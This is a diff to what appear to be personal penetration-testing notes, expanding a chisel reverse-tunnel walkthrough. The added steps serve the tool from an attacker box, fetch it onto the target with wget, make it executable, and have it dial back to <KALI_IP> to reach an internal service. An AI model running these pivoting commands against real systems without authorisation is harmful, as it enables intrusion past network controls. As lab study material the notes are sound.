@@ -46,19 +46,28 @@ Then run the client from where you dropped it: `cd /tmp && ./chisel client …`.
 
 The go-to for "there's a service on the target's `127.0.0.1:8080` I need to browse." **Reverse** = the target dials back to Kali, so it works even when you can't connect *into* the target (firewall/NAT).
 
-**Kali — start the server (listener):**
+**1. Kali — start the server (listener):**
 ```bash
-chisel server --reverse --port 8081
+cd ~/tools/chisel && ./chisel server --reverse --port 8081
 ```
-→ `--reverse` lets clients request reverse tunnels; `--port 8081` is chisel's own control port (target connects here).
+→ `--reverse` lets clients request reverse tunnels; `--port 8081` is chisel's own control port (target connects here). Leave it running.
 
-**Target — connect back and request the forward:**
+**2. Stage the binary onto the target** — chisel isn't on the target yet, and the `client` runs *there*. Serve it from Kali and pull it (full menu: [[File_Transfer]]):
 ```bash
-./chisel client <KALI_IP>:8081 R:8082:127.0.0.1:8080
+# Kali — NEW terminal (keep the server running in the first one)
+cd ~/tools/chisel && python3 -m http.server 8000
+# Target
+wget http://<KALI_IP>:8000/chisel -O /tmp/chisel && chmod +x /tmp/chisel
 ```
-→ `R:8082:127.0.0.1:8080` = **R**everse: open **8082 on Kali**, forward everything to the target's **`127.0.0.1:8080`**. Read it as `R:<kali_port>:<dest_as_seen_from_target>`.
+> You now have **two Kali listeners**: chisel control (**8081**) + temp file server (**8000**). `chmod +x` is required — wget drops the exec bit. If `./chisel` → `Permission denied`, `/tmp` is `noexec` → re-grab into `/dev/shm`. Already have SSH creds? `scp ~/tools/chisel/chisel user@<TARGET>:/tmp/` skips the file server entirely.
 
-**Kali — use it:** the internal service is now local.
+**3. Target — connect back and request the forward:**
+```bash
+/tmp/chisel client <KALI_IP>:8081 R:8082:127.0.0.1:8080
+```
+→ `R:8082:127.0.0.1:8080` = **R**everse: open **8082 on Kali**, forward to the target's **`127.0.0.1:8080`**. Read it as `R:<kali_port>:<dest_as_seen_from_target>`. Use your **current** tun0 IP for `<KALI_IP>` (`ip a show tun0`) — wrong IP = client hangs with no session.
+
+**4. Kali — use it:** the internal service is now local — browse/curl/Burp it. The server terminal prints a session line when the target connects.
 ```
 http://127.0.0.1:8082
 ```
